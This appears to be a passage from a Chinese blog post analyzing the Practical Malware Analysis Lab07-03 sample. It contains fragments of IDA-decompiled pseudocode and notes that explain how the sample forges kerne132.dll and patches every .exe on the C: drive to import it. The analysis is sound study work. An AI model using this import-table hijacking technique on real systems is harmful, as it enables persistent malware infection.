(_DWORD *)(v35 + <span class="number">4</span> * (_DWORD)v21);</span><br><span class="line">          v31 = (_WORD *)(v17 + <span class="number">2</span> * (_DWORD)v21);</span><br><span class="line">          v33 = v39;</span><br><span class="line">          v32 = v40;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *v32 == v22 )</span><br><span class="line">            &#123;</span><br><span class="line">              v24 = (<span class="type">const</span> <span class="type">char</span> *)sub_401040(*v33, v41, argca);</span><br><span class="line">              <span class="built_in">strcpy</span>(v19, v24);</span><br><span class="line">              *v31 = (_WORD)argvb;</span><br><span class="line">              *(_DWORD *)((<span class="type">char</span> *)v23 + v18 - v35) = &amp;v19[v42];</span><br><span class="line">              v25 = <span class="built_in">strlen</span>(v24) + <span class="number">1</span>;</span><br><span class="line">              v26 = &amp;v19[v25];</span><br><span class="line">              v27 = &amp;v19[v25 + <span class="number">9</span>];</span><br><span class="line">              *v23 = &amp;v26[v42];</span><br><span class="line">              *(_DWORD *)v26 = dword_403070;</span><br><span class="line">              *((_DWORD *)v26 + <span class="number">1</span>) = dword_403074;</span><br><span class="line">              v26[<span class="number">8</span>] = byte_403078;</span><br><span class="line">              <span class="built_in">strcpy</span>(v27, v24);</span><br><span class="line">              v28 = <span class="built_in">strlen</span>(v24) + <span class="number">1</span>;</span><br><span class="line">              v20 = v36;</span><br><span class="line">              argvb = (<span class="type">const</span> <span class="type">char</span> **)((<span class="type">char</span> *)argvb + <span class="number">1</span>);</span><br><span class="line">              v22 = i;</span><br><span class="line">              v19 = &amp;v27[v28];</span><br><span class="line">              ++v23;</span><br><span class="line">              ++v31;</span><br><span class="line">            &#125;</span><br><span class="line">            ++v32;</span><br><span class="line">            v29 = (<span class="type">unsigned</span> <span class="type">int</span>)++v37 &lt; v20[<span class="number">6</span>];</span><br><span class="line">            ++v33;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v29 );</span><br><span class="line">          v21 = argvb;</span><br><span class="line">          v18 = v43;</span><br><span class="line">          v17 = v44;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      i = ++v22;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hObject);</span><br><span class="line">    CloseHandle(v46);</span><br><span class="line">    <span class="keyword">if</span> ( !CopyFileA(ExistingFileName, NewFileName, <span class="number">0</span>) )<span class="comment">//将生成Lab07-3.dll的名字改为kerne132d.dll</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    sub_4011E0(aC, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这串带吗就是引用kernel32.dll的代码和Lab07.dll的代码来生成kerne132.dll（主要是内存中以偏移的方法将原本的导出表和新的导出表生成kerne132.dll）</p>
+<p>然后sub_4011E0(aC, 0);找到了c盘下所有exe文件并修改其中的导入表将kernel32.dll换为kerne132.dll然后每个exe加载的时候就直接加载kerne132.dll</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260416001949381.png" alt="image-20260416001949381"></p>
+<p>这个就是找到所有的exe文件的函数</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260416002045357.png" alt="image-20260416002045357"></p>
+<p>这个就是找到kernel32.dll的位置并替换的函数</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 笔记</a>
+          </div>
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">true</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">10k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">38 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="isso" type="application/json">{"enable":false}</script>
+<script src="/js/third-party/comments/isso.js?v=20260718" defer></script>
+
+</body>
+</html>
